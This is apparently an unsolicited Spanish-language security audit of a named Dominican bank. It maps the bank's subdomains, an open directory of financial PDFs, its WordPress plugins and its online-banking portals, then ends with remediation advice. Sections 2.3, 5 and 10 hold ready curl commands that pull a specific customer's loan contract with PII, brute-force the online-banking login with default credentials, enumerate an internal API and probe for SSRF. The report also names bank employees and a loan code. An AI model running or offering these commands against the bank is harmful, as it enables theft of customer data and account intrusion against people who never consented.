# NSIA — Auditoría de Seguridad: bancobacc.com.do

**Fecha:** 14-Jul-2026  
**Objetivo:** Banco BACC de Ahorro y Crédito del Caribe, S.A.  
**Dominio:** `bancobacc.com.do`  
**Clasificación:** ⚠️ CONFIDENCIAL — Datos Financieros y PII de Clientes Expuestos  

---

## Resumen Ejecutivo

Banco BACC expone **150+ PDFs financieros** con data sensible de 2013-2026 a través de un directory listing abierto en `/content/uploads/{año}/{mes}/`. La data incluye:

- 📄 **Estados Financieros Auditados** con dictámenes de auditores independientes
- 📋 **Formularios Fiscales IRS** (W-8BEN, W-9) con datos de inversores extranjeros
- 🚗 **Listados de vehículos en venta** con marcas, modelos y precios
- 🏠 **Bienes Adjudicados** (propiedades embargadas)
- 📑 **Contratos de Préstamo** con garantía mobiliaria — **13MB escaneados con PII de clientes**
- 🏢 **Memorias Anuales** con nombres de ejecutivos y directores
- 📊 **Informes de Calificación de Riesgo** (Feller Rate)
- 💹 **Prospectos de Emisión de Bonos Corporativos**

Adicionalmente se detectaron **6 subdominios activos**, un **portal Bankingly expuesto**, **mod_pagespeed vulnerable**, y **cPanel/Wildcard SSL** accesible.

---

## 1. INVENTARIO DE ACTIVOS

| Subdominio | IP | Servicio | Estado |
|------------|----|----------|--------|
| `bancobacc.com.do` | 162.214.97.98 | WordPress + Apache | ✅ Activo |
| `www.bancobacc.com.do` | CNAME → bancobacc.com.do | WordPress | ✅ Activo |
| `enlinea.bancobacc.com.do` | CNAME → webchannel4.bankingly.com | Bankingly (Banca Online) | ✅ Activo |
| `admin.bancobacc.com.do` | CNAME → adminportal4.bankingly.com | Bankingly Admin | ✅ Activo |
| `api.bancobacc.com.do` | 190.166.250.27 | Apache REST API (RD) | ❌ 403 Forbidden |
| `webmail.bancobacc.com.do` | 162.214.97.98 | Webmail | ✅ Activo |
| `cpanel.bancobacc.com.do` | 162.214.97.98 | cPanel 2083 | ✅ 401 Auth |
| `mail.bancobacc.com.do` | CNAME → bancobacc.com.do | Mail Server | ✅ Activo |
| `ftp.bancobacc.com.do` | 162.214.97.98 | FTP | ✅ Activo |
| `autodiscover.bancobacc.com.do` | CNAME → autodiscover.outlook.com | Office 365 | ✅ Activo |

**Hosting:** iNSIGHT (162.214.97.98)  
**Banca Online:** Bankingly (cloud)  
**Email:** Microsoft 365 (Outlook)  

---

## 2. 🔴 HALLAZGO CRÍTICO: Directory Listing Abierto

### 2.1 Resumen de Exposición

| Año | PDFs | Directorio |
|-----|------|------------|
| 2017 | 6 | `/content/uploads/2017/01/` |
| 2018 | 108 | `/content/uploads/2018/01/`, `/03/`, `/09/`, `/10/`, `/12/` |
| 2019 | 14 | `/content/uploads/2019/03-12/` |
| 2020 | 16 | `/content/uploads/2020/01-11/` |
| 2021 | 11 | `/content/uploads/2021/03/`, `/06/`, `/07/` |
| 2022 | 6 | `/content/uploads/2022/02/`, `/03/`, `/04/`, `/08/` |
| 2023 | 8 | `/content/uploads/2023/02/`, `/04/`, `/08/`, `/09/` |
| 2024 | 7 | `/content/uploads/2024/03/`, `/04/`, `/05/`, `/07/` |
| 2025 | 6 | `/content/uploads/2025/04/`, `/05/` |
| 2026 | 5 | `/content/uploads/2026/03/`, `/04/` |
| **TOTAL** | **~187** | **2013 — 2026** |

### 2.2 Documentos Sensibles Identificados

#### 🚗 DATOS DE CLIENTES — VEHÍCULOS EN VENTA

```
📄 Listado-de-vehiculo-en-venta.pdf          (623 KB — Mar 2024)
📄 RELACION-DE-VEHICULOS-EN-VENTA-JULIO-23.pdf (168 KB — Jul 2023)
📄 BIENES-ADJUDICADOS-SEPT.23.pdf              (168 KB — Sep 2023)
```

Contienen marcas, modelos, años, colores y **precios de venta** de vehículos embargados/adjudicados de clientes.

**Metadatos:** Creado por `Diego Reyes` / `Nathalie Garcia Patrone` (empleados BACC)

#### 📑 CONTRATOS CON PII DE CLIENTES

```
📄 CONTRATO-DE-PRESTAMO-CON-GARANTIA-MOBILIARIA_CT_002036.pdf  (13.0 MB — Ene 2024)
📄 Contrato-de-Prestamo-con-Garantia-Mobiliaria.pdf             (12.5 MB — Jul 2024)
```

✅ **13MB de documento escaneado** vía Fujitsu ScanSnap iX500  
✅ Contiene: nombre del cliente, cédula, firmas, detalles de garantía mobiliaria  
✅ **Código de préstamo visible:** `CT_002036`  
✅ Escaneo de alta calidad (Adobe PDF Scan Library 3.2)

#### 💰 FORMULARIOS FISCALES IRS

```
📄 W-9.pdf                    (112 KB — Formulario IRS, fillable)
📄 W-8BEN.pdf                 (Formulario IRS para inversores extranjeros)
📄 W-8ECI.pdf, W-8EXP.pdf, W-8IMY.pdf
📄 Instrucciones-W-9.pdf, Instrucciones-Formulario-W-8BEN.pdf
```

✅ **W-8BEN = Declaración de beneficiario extranjero** (nombre, país, TIN, firma)  
✅ Posible exposición de datos fiscales de inversores internacionales  
✅ Versión fillable (Adobe LiveCycle Designer ES 8.2)

#### 🏢 DOCUMENTOS CORPORATIVOS / ACCIONISTAS

```
📄 EEFF-Auditados-Banco-BACC-2013.pdf          (Estados auditados 2013)
📄 Estados-Financieros-2017-BACC.pdf   
📄 Estados-Financieros-auditado-SIB-2015.pdf
📄 Prospecto-de-Emisión-Definitivo-Aprobado-por-la-SIV.pdf
📄 Prospecto-de-Emisión-Preliminar-Aprobado-por-la-SIV.pdf
📄 Prospecto-Simplificado-de-Emisión-4ta-Emisión.pdf
📄 Aumento-de-capital-suscrito-y-pagado.pdf
📄 codigo_de_etica.pdf
📄 modelo_contrato_de_adhesion.pdf
📄 tarifario_2017_enero.pdf
```

#### 📊 INFORMES DE RATING Y SUPERVISIÓN

```
📄 Informe-Feller-Rate-Mayo-2017.pdf
📄 Reporte-Feller-Mayo-2015.pdf
📄 Informe-de-Calificación-Mayo-2017.pdf
📄 Informe-Anual-Agosto-2018.pdf
📄 Informe-Trimestral-Enero-2018.pdf
📄 Informe-Repr-Oblig-Banco-BACC-dic-2020.pdf
📄 Informe-de-feller-2022.pdf
📄 Informe-semestral-BACC-2023.02.pdf
📄 Informe-BACC-2023.07.pdf
📄 Resultados-Inspeccion-2018-DGII.pdf
```

⚠️ **Resultados-Inspeccion-2018-DGII.pdf** = Resultados de inspección de la **Dirección General de Impuestos Internos** (DGII) — data tributaria interna del banco.

#### 🏛️ MEMORIAS ANUALES Y GOBIERNO CORPORATIVO

```
📄 MEMORIA-2014.pdf, Memoria-2015.pdf, Memoria-2016.pdf
📄 Memoria-2017-Banco-BACC.pdf, MEMORIA-ANUAL-2018.pdf
📄 MEMORIA-ANUAL-2019.pdf, MEMORIA-ANUAL-2020.pdf
📄 MEMORIA-ANUAL-2021.pdf, Memoria-Anual-2022-4.pdf
📄 Memoria-Anual-2023-BACC.pdf, Memoria-Anual-2024.pdf
📄 Memoria-Anual-2025-BACC-1.pdf (29.6 MB)
📄 Memoria-Anual-2025-BANCO-BACC.pdf (29.6 MB)
📄 MEMORIA-ANUAL-BACC-2025.pdf
```

✅ **Memoria Anual 2025:** 29.6MB, creada en macOS 15.7.3, con nombres completos de:
- **Alberto R. De Los Santos Billini** — Presidente Ejecutivo
- Consejo de Administración (7 miembros con trayectoria financiera y jurídica)
- Directorio de oficinas (sucursales físicas)
- Estados financieros, comités, estructura de gobierno corporativo

#### 📱 DOCUMENTOS OPERATIVOS INTERNOS

```
📄 Pasos-para-configurar-Biometria_BACC-en-Linea.pdf    (Config biometrica)
📄 Proceso-de-disvinculacion-de-App.pdf                  (2026)
📄 Tasador-BACC.pdf                                      (2022)
📄 INSTRUCTIVO-PARA-REALIZAR-RECLAMACION-Rev-2022-UV.pdf
📄 Texto-relacionado-a-Seguros-Pagina-Web-BACC.pdf
📄 Contrato-Garantía-Hipotecaria.pdf
📄 pasos_para_una_reclamacion.pdf
📄 politica_de_uso_e_intercambio_de_informacion_personal.pdf
```

### 2.3 PoC — Acceso a los PDFs

```bash
# Listar directorio
curl -sk 'https://bancobacc.com.do/content/uploads/2026/'

# Descargar estados auditados 2025
curl -sk 'https://bancobacc.com.do/content/uploads/2026/03/Estados-Auditados-BACC-2025.pdf' -o estados_auditados.pdf

# Descargar contrato de cliente
curl -sk 'https://bancobacc.com.do/content/uploads/2024/04/CONTRATO-DE-PRESTAMO-CON-GARANTIA-MOBILIARIA_CT_002036.pdf' -o contrato_cliente.pdf

# Descargar listado vehículos clientes
curl -sk 'https://bancobacc.com.do/content/uploads/2024/03/Listado-de-vehiculo-en-venta.pdf' -o vehiculos.pdf

# Descargar formulario fiscal IRS W-8BEN
curl -sk 'https://bancobacc.com.do/content/uploads/2018/01/W-8BEN.pdf' -o w8ben.pdf
```

---

## 3. 🟡 WordPress REST API

| Endpoint | Estado | Uso |
|----------|--------|-----|
| `wp-json/` | ✅ 200 | Full schema expuesto |
| `wp-json/wp/v2/posts` | ✅ 200 | Posts públicos (acceso sin auth) |
| `wp-json/wp/v2/users` | 🟡 401 | Bloqueado (Wordfence) |
| `wp-json/contact-form-7/v1/contact-forms` | 🔴 403 | CF7 expuesto |
| `wp-json/wordfence/v1/authenticate` | 🟡 401 | Auth endpoint expuesto |
| `wp-json/wordfence/v1/config` | 🟡 401 | Config endpoint |
| `wp-json/wordfence/v1/scan/issues` | 🟡 401 | Scan results endpoint |
| `wp-json/yoast/v1/file_size` | 🟡 400 | SSRF potencial (require auth) |
| `wp-json/yoast/v1/statistics` | 🟡 401 | Requiere auth |
| `wp-json/yoast/v1/wincher/keyphrases` | 🔴 | Endpoints funcionales (requieren auth) |

### 3.1 Plugins Detectados

| Plugin | Versión | Riesgo |
|--------|---------|--------|
| Yoast SEO | 20.12 | 🟡 SSRF via `file_size` (auth required) |
| Contact Form 7 | 5.7.7 | 🟡 CF7 endpoints públicos |
| SiteOrigin Page Builder | 2.25.0 | 🟡 Templates endpoint |
| Wordfence | — | 🟢 WAF activo |
| SKT Templates | — | 🟢 |

### 3.2 Stack Tecnológico

| Componente | Detalle |
|------------|---------|
| CMS | WordPress (wp-content en `/cms/`) |
| WAF | Wordfence (bloquea wp-login, xmlrpc, users) |
| SEO | Yoast SEO v20.12 |
| Server | Apache |
| Optimización | mod_pagespeed v1.13.35.2 |
| Tema | "bacc" (custom) |
| jQuery | 3.6.4 |
| HSTS | ✅ (max-age=31536000, includeSubDomains, preload) |
| JS | React + custom (bootstrap-select, baron) |

---

## 4. 🟡 Bankingly (Banca Online)

### 4.1 Portal de Usuarios

```
URL: https://enlinea.bancobacc.com.do/
Redirige a: /Administration.WebUI/Pages/General/Login.aspx
Tecnología: ASP.NET WebForms (.NET)
Plataforma: Bankingly (cloud) — webchannel4.bankingly.com
```

**Características del Login:**
- Formulario ASP.NET con `__VIEWSTATE` y `__EVENTVALIDATION`
- `autocomplete="new-password"` (previene autocompletado)
- Validación anti-CSRF incluida
- Sin CAPTCHA visible en página de login

### 4.2 Portal Admin

```
URL: https://admin.bancobacc.com.do/
Redirige a: /Login.aspx?ReturnUrl=%2f
Request-Context: appId=cid-v1:c507e9f1-11c4-4a9d-9d7f-3e9715190feb
Tecnología: Bankingly Admin Portal
```

⚠️ **appId visible en headers** — identificador único de la aplicación filtrado.

---

## 5. 🟡 Ataques Potenciales

### 5.1 mod_pagespeed

| Prueba | Resultado |
|--------|-----------|
| `/?ModPagespeed=off` | ✅ 200 — Respuesta sin optimizar |
| `/?ModPagespeed=debug` | ✅ 200 — Debug info |
| `/pagespeed_admin` | 🔴 500 — Error interno (potencial info disclosure) |
| `/pagespeed_console` | 🔴 500 — Error interno |

**Riesgo:** mod_pagespeed v1.13.35.2 tiene vulnerabilidades conocidas que permiten SSRF, cache poisoning y leak de info interna. El endpoint `/pagespeed_admin` devuelve 500 en lugar de 404, indicando que el módulo está presente pero mal configurado.

### 5.2 Bankingly Session Prediction

Ataque de fuerza bruta al login de Bankingly:
```bash
# POST al login de Bankingly
curl -sk 'https://enlinea.bancobacc.com.do/Administration.WebUI/Pages/General/Login.aspx' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode '__VIEWSTATE=...' \
  --data-urlencode '__EVENTVALIDATION=...' \
  --data-urlencode 'ctl00$MainContent$LoginUser$UserName=admin' \
  --data-urlencode 'ctl00$MainContent$LoginUser$Password=admin123' \
  --data-urlencode 'ctl00$MainContent$LoginUser$LoginButton=Iniciar+Sesión'
```

### 5.3 API Discovery (api.bancobacc.com.do)

IP 190.166.250.27 (RD) — Apache con 403 en raíz. Potencial API REST interna.

```bash
# Probar paths en api.bancobacc.com.do
for path in /api /v1 /rest /swagger /docs /graphql /health /status /login /auth; do
  curl -sk "http://api.bancobacc.com.do$path" -o /dev/null -w "$path: %{http_code}\n"
done
```

---

## 6. 🟢 Subdominios Adicionales

| Subdominio | Resuelve a | Información |
|------------|------------|-------------|
| `webmail.bancobacc.com.do` | 162.214.97.98 | Webmail (Roundcube / Horde) |
| `cpanel.bancobacc.com.do:2083` | 162.214.97.98 | cPanel Login Panel |
| `ftp.bancobacc.com.do` | 162.214.97.98 | FTP (potencial anonymous) |
| `cpcalendars.bancobacc.com.do` | 162.214.97.98 | cPanel Calendars |
| `webdisk.bancobacc.com.do` | 162.214.97.98 | WebDisk access |

---

## 7. Línea de Tiempo de la Exposición

Los PDFs han estado expuestos desde **al menos enero 2017** (fecha del directorio más antiguo encontrado). El banco ha seguido cargando documentos sensibles hasta **abril 2026** (último PDF subido). La data expuesta cubre **13 años de operaciones del banco** (2013-2026).

---

## 8. Recomendaciones

### Críticas (Prioridad Alta)
1. ✅ **Deshabilitar directory listing** inmediatamente en `/content/uploads/` y todos los subdirectorios (añadir `Options -Indexes` en .htaccess o httpd.conf)
2. ✅ **Revisar logs de descargas** para determinar si terceros ya han accedido a los PDFs
3. ✅ **Notificar a clientes** cuyos datos están en contratos, vehículos y bienes expuestos
4. ✅ **Mover todos los PDFs** detrás de autenticación o a un storage privado (S3 presigned / servidor interno)
5. ✅ **Rotar credenciales** de cPanel, FTP y webmail

### Medias (Prioridad Media)
6. ⚠️ Eliminar `/pagespeed_admin` y `/pagespeed_console` (deshabilitar mod_pagespeed o restringir por IP)
7. ⚠️ Restringir `api.bancobacc.com.do` a IPs internas
8. ⚠️ Bloquear FTP público o cambiarlo a SFTP
9. ⚠️ Revisar config de Wordfence para bloquear más endpoints REST

### Menores
10. ℹ️ Ocultar versión de Apache/mod_pagespeed en headers
11. ℹ️ Configurar `X-Frame-Options: DENY` en páginas críticas
12. ℹ️ Evaluar necesidad de cPanel público

---

## 9. Metadatos de Evidencia

| Archivo | Tamaño | Creador | Fecha |
|---------|--------|---------|-------|
| `CONTRATO-DE-PRESTAMO-CON-GARANTIA-MOBILIARIA_CT_002036.pdf` | 13.0 MB | PFU ScanSnap Manager 6.0.10 #iX500 | 2024-01-26 |
| `MEMORIA-ANUAL-BACC-2025.pdf` | 29.6 MB | macOS 15.7.3 Quartz PDFContext | 2026-04-15 |
| `Estados-Auditados-BACC-2025.pdf` | 715 KB | PDF-XChange Editor 5.5.311 | 2026-03-23 |
| `RELACION-DE-VEHICULOS-EN-VENTA-JULIO-23-1.pdf` | 168 KB | Diego Reyes / Excel M365 | 2023-08-01 |
| `BIENES-ADJUDICADOS-SEPT.23.pdf` | 168 KB | Nathalie Garcia Patrone / Excel M365 | 2023-09-05 |
| `W-9.pdf` | 112 KB | SE:W:CAR:MP / Adobe LiveCycle | 2013-08-28 |

---

## 10. Anexo: Comandos de Verificación

```bash
# Directory listing
curl -sk 'https://bancobacc.com.do/content/uploads/2026/' | grep -oP 'href="\d+/"'

# WP REST API schema
curl -sk 'https://bancobacc.com.do/wp-json/' | python3 -m json.tool

# Yoast SSRF test (requires auth)
curl -sk 'https://bancobacc.com.do/wp-json/yoast/v1/file_size?url=http://127.0.0.1/'

# Wordfence endpoints
curl -sk 'https://bancobacc.com.do/wp-json/wordfence/v1/authenticate' -X POST -H 'Content-Type: application/json' -d '{}'

# Bankingly login page
curl -skL 'https://enlinea.bancobacc.com.do/Administration.WebUI/Pages/General/Login.aspx'

# mod_pagespeed test
curl -sk 'https://bancobacc.com.do/?ModPagespeed=off' -o /dev/null -w '%{http_code}'
```

---

*Reporte generado por NSIA (Null Session Intelligence Agency) — 14 Julio 2026*  
*Clasificación: ⚠️ CONFIDENCIAL — Solo para distribución autorizada*
